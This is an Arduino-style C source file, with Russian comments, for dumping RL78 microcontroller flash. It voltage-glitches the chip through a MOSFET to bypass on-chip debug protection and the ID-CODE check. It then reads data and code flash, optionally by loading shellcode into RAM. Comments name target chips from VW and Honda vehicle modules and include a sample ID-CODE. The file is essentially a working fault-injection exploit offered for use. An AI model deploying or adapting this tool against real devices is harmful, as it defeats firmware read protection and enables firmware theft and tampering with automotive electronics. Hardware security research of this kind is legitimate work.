#define DEMO_MODE      1 // Вывод только первых 0x100 байт FLASH.

#define MCU_GLITCH_PIN 2 // Подключаем к затвору MOSFET. Сток к VDD или REGC. Исток к GND. 
#define MCU_RST_PIN    3

#include "ProtocolA.h"

uint8_t buf[0x100];

volatile bool glitch_protect_error = false;
volatile bool glitch_ID_CODE = false;
volatile int glitch_delay = 0;

volatile int CFLASH_SIZE = 0;
volatile int DFLASH_SIZE = 0;

void setup() {
    sleep_ms(1000);
    Serial.begin(9600);
    Serial.println("\n\nMCU RL78 reader welcome!");
    
    MCU_glitch_init();
    MCU_init_uart();
    MCU_break_condition();
    MCU_identify();

    sleep_ms(500);
    Serial.println("Entering OCD Mode..");

    int time_at = millis();
    do {
        MCU_break_condition();
    } while (! MCU_OCD_bypass());

    Serial.print("\nGlitch took (ms): "); Serial.print(millis()-time_at);
    Serial.print("\nGlitch delay(ms): "); Serial.println(glitch_delay);

    sleep_ms(50);
    MCU_OCD_prepare_for_reading();
    if (DEMO_MODE) {
        DFLASH_SIZE = CFLASH_SIZE = 0x100;
    }
    MCU_OCD_read_DFLASH();
    MCU_OCD_read_CFLASH();
    // MCU_OCD_read_CFLASH_via_shell();
}

void loop() {}


void MCU_identify() {
    buf[0] = MODE_SINGLE_UART;
    MCU_send_buf(1);

    sleep_us(10);
    buf[2] = CMD_SET_BAUDE_RATE;
    buf[3] = 0;
    buf[4] = 50;
    MCU_send_cmd(3);

    sleep_ms(20);
    buf[2] = CMD_RESET;
    MCU_send_cmd(1);

    buf[2] = CMD_SIGNATURE;
    MCU_send_cmd(1);
    MCU_read_cmd();
    Serial_print_str("Device: ",       &buf[5],  10);
    Serial_print_hex("Boot FW ver.: ", &buf[21], 3);
    Serial_print_hex("Device code: ",  &buf[2],  3);
    Serial_print_hex("Code end: ",     &buf[15], 3);
    Serial_print_hex("Data end: ",     &buf[18], 3);

    CFLASH_SIZE = 1 + buf[15] + (buf[16] << 8) + (buf[17] << 16);
    DFLASH_SIZE = 1 + buf[18] + (buf[19] << 8) + (buf[20] << 16) - 0x0F1000;

    buf[2] = CMD_SECURITY_GET;
    MCU_send_cmd(1);
    MCU_read_cmd();
    Serial_print_hex("Security: ", buf, 12);

    // sec: 02 08 FE 07 00 00 7F 00 FF FF 76 03 - R5F10AGG - VW 5Q1953569C
    // sec: 02 08 FE 07 00 00 FF 00 FF FF F6 03 - R5F10PPJ - Honda Relay Module
}

bool MCU_OCD_bypass() {
    MCU_uart_clear();
    buf[0] = MODE_OCD;
    MCU_send_buf(1);

    buf[2] = CMD_SET_BAUDE_RATE;
    buf[3] = 0;
    buf[4] = 50;
    MCU_send_cmd(3);
    switch (buf[2]) {
        case STS_ACK:
            glitch_protect_error = false;
            MCU_read_blocking(1); // ping 00
            MCU_send_buf(1);      // pong 00
            MCU_read_blocking(1); // ping 00
            break;

        case STS_PROTECT_ERR:
            if (! glitch_protect_error) {
                Serial.println("Switch to glitch ProtectError..");
                glitch_protect_error = true;
            }
            sleep_us(850);
            sleep_us(random(6300));
            gpio_put(MCU_GLITCH_PIN, 1);
            sleep_us(random(6.3));
            gpio_put(MCU_GLITCH_PIN, 0);
            sleep_ms(15);
            break;

        default:
            Serial.println("Unxpected response on x9A.");
            return false;
    }

    do {
        Serial.print(".");
        MCU_uart_clear(); // удаляем NACK и ACK ответы и 0x00

        switch (MCU_OCD_connect()) {
            case OCD_STS_UNLOCKED: return true;
            case OCD_STS_LOCKED:   break;
            default:               return false;
        }
        sleep_us(500);

        // ID-CODE
        // uint8_t pass_buf[] = {0x1E, 0xFC, 0x0E, 0x3E, 0x9D,  0xED, 0xFA, 0xE7, 0x35, 0xA7}; // для 5Q1953569C
        // memcpy(buf, pass_buf, 10);
        memset(buf, 0, 10);
        uint8_t id_code_checksum = ~cmd_checksum(buf, 10);
        MCU_send_buf(10);

        if (glitch_ID_CODE) {
            // А тут глитчим аккурат после отправки контрольного числа ID-CODE:
            glitch_delay = 88 + random(5);
            add_alarm_in_us(glitch_delay, &alert_MCU_glitch, NULL, false);
        }
        buf[0] = id_code_checksum;
        MCU_send_buf(1);
        MCU_read_nonblocking(1);
        if (OCD_STS_UNLOCK_ERR == buf[0]) {
            if (! glitch_ID_CODE) {
                Serial.println("Switch to glitch ID-CODE..");
            }
            glitch_ID_CODE = true;
        }
        // Serial_print_hex("ID-CODE ack:     ", buf, 1);
    } while (OCD_STS_UNLOCK_OK != buf[0]);

    return OCD_STS_UNLOCKED == MCU_OCD_connect();
}

uint8_t MCU_OCD_connect() {
    MCU_OCD_cmd(1, 1, (uint8_t[]) {OCD_CMD_CONNECT});
    // Serial_print_hex("OCD connect ack: ", buf, 1);
    return buf[0];
}

void MCU_OCD_prepare_for_reading() {
    MCU_OCD_cmd(20, 1, (uint8_t[]) {OCD_CMD_WRITE, 0xE0, 0x07, 0x10, 0xCB, 0xF8, 0xE0, 0xFE, 0xEC, 0xC7, 0xFF, 0x0E, 0, 0, 0, 0, 0, 0, 0, 0});
    MCU_OCD_cmd(1,  1, (uint8_t[]) {OCD_CMD_EXEC});
    MCU_OCD_cmd(7,  1, (uint8_t[]) {OCD_CMD_WRITE, 0x81, 0, 3, 0, 0xFF, 0});
    MCU_OCD_cmd(5,  1, (uint8_t[]) {OCD_CMD_WRITE, 0x78, 0, 1, 0x80});
    MCU_OCD_cmd(5,  1, (uint8_t[]) {OCD_CMD_WRITE, 0x90, 0, 1, 1});
}

void MCU_OCD_read_DFLASH() {
    Serial.print("DATA FLASH [0x"); Serial.print(DFLASH_SIZE, HEX); Serial.println("]:"); 

    for (int i=0; i < (DFLASH_SIZE >> 8); i++) {
        MCU_OCD_cmd(4, 0x100, (uint8_t[]) {OCD_CMD_READ, 0, (uint8_t) (0x10 + i), 0});
        Serial_print_hex("", buf, 0x100);
    }
}

void MCU_OCD_read_CFLASH() {
    Serial.print("CODE FLASH [0x"); Serial.print(CFLASH_SIZE, HEX); Serial.println("]:"); 

    MCU_OCD_cmd(17, 1, (uint8_t[]) {OCD_CMD_WRITE, 0, 0xFB, 0xD, 0x11, 0x8B, 0x99, 0xA5, 0xA7, 0xB3, 0x13, 0x44, 0, 0, 0xDF, 0xF4, 0xD7});

    for (int i=0; i < (CFLASH_SIZE >> 8); i++) {
        sleep_ms(2);
        MCU_OCD_cmd(20, 1, (uint8_t[]) {OCD_CMD_WRITE, 0xE0, 7, 0x10, 0x41, (uint8_t) (i >> 8), 0x36, 0, (uint8_t) i, 0x34, 0, 0xFC, 0x32, 0, 1, 0xEC, 0, 0xFB, 0xF, 0});
        sleep_ms(2);
        MCU_OCD_cmd(1,  1, (uint8_t[]) {OCD_CMD_EXEC});
        sleep_ms(2);
        MCU_OCD_cmd(4, 0x100, (uint8_t[]) {OCD_CMD_READ, 0, 0xFC, 0});
        Serial_print_hex("", buf, 0x100);
    }
}

void MCU_OCD_read_CFLASH_via_shell() {
    Serial.print("CODE FLASH [0x"); Serial.print(CFLASH_SIZE, HEX); Serial.println("]:");

    // Загрузка shellcode в RAM по адресу F07E0
    MCU_OCD_cmd(42, 1, (uint8_t[]) {OCD_CMD_WRITE, 0xE0, 0x07, 0x26, 0x41, 0x00, 0x34, 0x00, 0x00, 0x00, 0x11, 0x89, 0xFC, 0xA1, 0xFF, 0x0E, 0xA5, 0x15, 0x44, 0x00, 0x00, 0xDF, 0xF3, 0xEF, 0x04, 0x55, 0x00, 0x00, 0x00, 0x8E, 0xFD, 0x81, 0x5C, 0x0F, 0x9E, 0xFD, 0x71, 0x00, 0x90, 0x00, 0xEF, 0xE0});
    MCU_OCD_cmd(1, 1, (uint8_t[]) {OCD_CMD_EXEC});

    for (int i=0; i < (CFLASH_SIZE >> 8); i++) {
        MCU_read_blocking(0x100);
        Serial_print_hex("", buf, 0x100);
    }
}

void MCU_OCD_cmd(int cmd_len, int ack_len, const uint8_t cmd[]) {
    memcpy(buf, cmd, cmd_len);
    MCU_send_buf(cmd_len);
    if (cmd[0] == OCD_CMD_CONNECT) {
        MCU_read_nonblocking(ack_len); // При glitch-е может зависать.
    } else {
        MCU_read_blocking(ack_len);
    }
    if ((cmd[0] == OCD_CMD_WRITE || cmd[0] == OCD_CMD_EXEC) && buf[0] != cmd[0]) {
        Serial_print_hex("Unexpected cmd response: ", buf, ack_len);
    }
}
